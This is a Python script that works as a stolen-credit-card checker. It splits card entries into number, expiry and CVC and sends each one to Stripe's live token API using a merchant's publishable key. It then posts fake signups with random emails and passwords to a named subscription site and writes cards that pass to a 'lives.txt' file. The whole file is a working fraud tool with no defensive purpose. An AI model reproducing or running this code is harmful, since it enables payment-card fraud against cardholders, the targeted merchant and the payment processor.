    
from colorama import Fore, Back, init
from bs4 import BeautifulSoup
import requests
import random
import json
import time
import string
import os


def randomString2(stringLength=8):
    """Generate a random string of fixed length """
    letters= string.ascii_lowercase
    return ''.join(random.sample(letters,stringLength))

def StripeAutomate(credit_card, ccEntry, firstname="Jems", lastname="Arno"):
    ccEntry = str(ccEntry)
    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
    api_token = "https://api.stripe.com/v1/tokens"
    session = requests.Session()
    main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
    user_agent =  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
    }

    stripe_data = {
        'time_on_page': random.randint(55382, 68020),
        'guid': '7a9173a6-2a38-486a-aa16-e7071a83a244',
        'muid': '5213c855-3bb9-4f44-8ae8-24e0c1d8ab5e',
        'sid': 'e6eb5163-ecae-435c-bb4f-67071ed01643',
        'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
        'payment_user_agent': 'stripe.js/8ab9a2f',
        'card[number]': ccNum,
        'card[cvc]': ccCode,
        'card[exp_month]': ccMonth,
        'card[exp_year]': ccYear,
        'card[name]': firstname + ' ' + lastname,
    }
    
    stripe_response = json.loads(session.post(api_token, data=stripe_data, headers=headers).text)
    try:
        token = stripe_response['id']
    except Exception:
        print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' / FRAUD DETECT!')
        return

    result_data = {
        'user_type': '1',
        'email_id': randomString2(20) + "@gmail.com",
        'password': randomString2(12),
        'card-name': firstname + ' ' + lastname,
        'card-number': ccNum,
        'card-cvc': ccCode,
        'amount': '1599',
        'email': 'none@none.com',
        'stripe_plan': 'STDmonthly299',
        'stripeToken': token,
        'stripe_plan': 'STDmonthly299',
        'amount': '2.99',
        'planid': 'STD',
        'planprice': '2.99',
        'term': 'monthly',
    }
    result = session.post('https://doc2scan.com/signup-register.php', data=result_data,).text
    try:
        res = BeautifulSoup(result, 'html.parser').findAll('font', {'color': 'red'})[1].get_text()
        if 'code' in res.lower():
            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
            with open("lives.txt", "a") as filelive:
                filelive.write(credit_card + " - Invalid CVV")
                filelive.close()
            return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
        else:
            print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
            return('DEAD\t----\t' + credit_card + " => " + res.replace("\n", ""))
    except Exception as e:
        print("LIVE\t----\t" + credit_card)
        with open("lives.txt", "a") as livefile:
            livefile.write(credit_card + " - Valid CVV")
            livefile.close()
        return("LIVE\t----\t" + credit_card)
